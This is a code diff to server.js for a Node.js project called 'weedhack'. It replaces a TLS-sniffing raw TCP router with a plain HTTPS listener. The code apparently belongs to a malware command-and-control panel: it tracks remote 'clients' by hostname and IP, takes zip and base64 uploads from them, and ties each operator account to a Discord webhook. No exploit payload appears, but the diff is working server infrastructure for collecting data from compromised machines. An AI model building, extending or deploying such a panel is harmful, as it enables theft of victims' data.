@@ -1,5 +1,5 @@
 // language: JavaScript, file: server.js, target: Node 22.5+
-// weedhack — http :80, tls-sniff :443 (https + raw json), udp :880.
+// weedhack — http :80 (dashboard), https :443 (dashboard + /api/rpc), udp :880.
 
 import 'dotenv/config';
 import express from 'express';
@@ -12,12 +12,11 @@ import crypto from 'node:crypto';
 import fs from 'node:fs';
 import http from 'node:http';
 import https from 'node:https';
-import net from 'node:net';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import db, { UPLOAD_DIR } from './db.js';
 import { startUdp } from './net.js';
-import { handleRpc, handleTcpLine } from './tcp_rpc.js';
+import { handleRpc } from './tcp_rpc.js';
 
 const __dirname  = path.dirname(fileURLToPath(import.meta.url));
 const PUBLIC_DIR = path.join(__dirname, 'public');
@@ -82,7 +81,7 @@ app.use((req, res, next) => {
   next();
 });
 
-// rpc — big json body for base64 uploads
+// ---------- rpc (client) ----------
 app.post('/api/rpc',
   express.json({ limit: Math.ceil(CFG.maxUpload * 1.5) }),
   (req, res) => {
@@ -96,7 +95,6 @@ app.post('/api/rpc',
   }
 );
 
-// upload — raw binary
 app.use('/api/client/upload', express.raw({
   type: ['application/zip', 'application/octet-stream'],
   limit: CFG.maxUpload,
@@ -172,6 +170,7 @@ app.get('/api/health', (_req, res) => {
   });
 });
 
+// ---------- auth ----------
 app.post('/api/signup', limitAuth, async (req, res) => {
   const { username, email, password, discordWebhook } = req.body || {};
   if (!username || !email || !password || !discordWebhook)
@@ -260,6 +259,7 @@ app.post('/api/webhook/test', requireAuth, limitWebhook, async (req, res) => {
   res.json({ ok: true });
 });
 
+// ---------- dashboard ----------
 app.get('/api/clients', requireAuth, (req, res) => {
   const rows = db.prepare(sql`
     SELECT id, hostname, ip, last_seen FROM clients
@@ -335,8 +335,7 @@ app.use((err, _req, res, _next) => {
   res.status(500).json({ error: 'server error' });
 });
 
-// ---------- listeners ----------
-let udpBound = false;
+// ---------- udp ----------
 const udpSock = startUdp({
   host: CFG.bindHost,
   port: CFG.udpPort,
@@ -345,9 +344,8 @@ const udpSock = startUdp({
     s.send(reply, rinfo.port, rinfo.address, () => {});
   },
 });
-udpSock.on('listening', () => { udpBound = true; });
 
-// port 80 — plain http dashboard
+// ---------- http :80 ----------
 const httpServer = http.createServer(app);
 httpServer.listen(CFG.httpPort, CFG.bindHost, () => {
   console.log(`[startup] cwd     = ${process.cwd()}`);
@@ -355,57 +353,24 @@ httpServer.listen(CFG.httpPort, CFG.bindHost, () => {
   console.log(`[startup] cert    = ${CFG.tlsCert}`);
   console.log('');
   console.log(`WeedHack http up on ${CFG.bindHost}:${CFG.httpPort}`);
-  console.log(`WeedHack tcp  on ${CFG.bindHost}:${CFG.tcpPort}  (TLS + raw JSON sniffer)`);
-  console.log(`WeedHack udp  on ${CFG.bindHost}:${CFG.udpPort}`);
 });
 
-// port 443 — https server does TLS, router sniffs first byte
+// ---------- https :443 ----------
 const tlsHttpServer = https.createServer(tlsOpts, app);
 tlsHttpServer.on('tlsClientError', (e) => console.log(`[tls] client err: ${e.message}`));
-
-const router = net.createServer((sock) => {
-  sock.once('data', (first) => {
-    sock.pause();
-    sock.unshift(first);
-
-    if (first[0] === 0x16) {
-      // TLS handshake — let https.Server handle the handshake on this raw socket
-      tlsHttpServer.emit('connection', sock);
-      sock.resume();
-    } else {
-      // raw JSON line protocol
-      sock.setEncoding('utf8');
-      sock.setTimeout(120_000, () => sock.destroy());
-      let buf = '';
-      sock.on('data', (chunk) => {
-        buf += chunk;
-        let i;
-        while ((i = buf.indexOf('\n')) !== -1) {
-          const line = buf.slice(0, i).trim();
-          buf = buf.slice(i + 1);
-          if (line) handleTcpLine(line, sock, sock.remoteAddress);
-        }
-        if (buf.length > 128 * 1024 * 1024) sock.destroy();
-      });
-      sock.on('error', () => {});
-      sock.resume();
-    }
-  });
-  sock.on('error', () => {});
+tlsHttpServer.listen(CFG.tcpPort, CFG.bindHost, () => {
+  console.log(`WeedHack https on ${CFG.bindHost}:${CFG.tcpPort}`);
+  console.log(`WeedHack udp   on ${CFG.bindHost}:${CFG.udpPort}`);
 });
 
-router.listen(CFG.tcpPort, CFG.bindHost, () => {
-  console.log(`[router] sniffing on ${CFG.bindHost}:${CFG.tcpPort}`);
-});
-router.on('error', (e) => console.error(`[router] err: ${e.message}`));
-
+// ---------- shutdown ----------
 let shuttingDown = false;
 function shutdown(sig) {
   if (shuttingDown) return;
   shuttingDown = true;
   console.log(`\n[shutdown] ${sig}`);
   httpServer.close(() => console.log('[shutdown] http closed'));
-  router.close(() => console.log('[shutdown] router closed'));
+  tlsHttpServer.close(() => console.log('[shutdown] https closed'));
   try { udpSock.close(() => console.log('[shutdown] udp closed')); } catch {}
   setTimeout(() => process.exit(0), 3000).unref();
 }
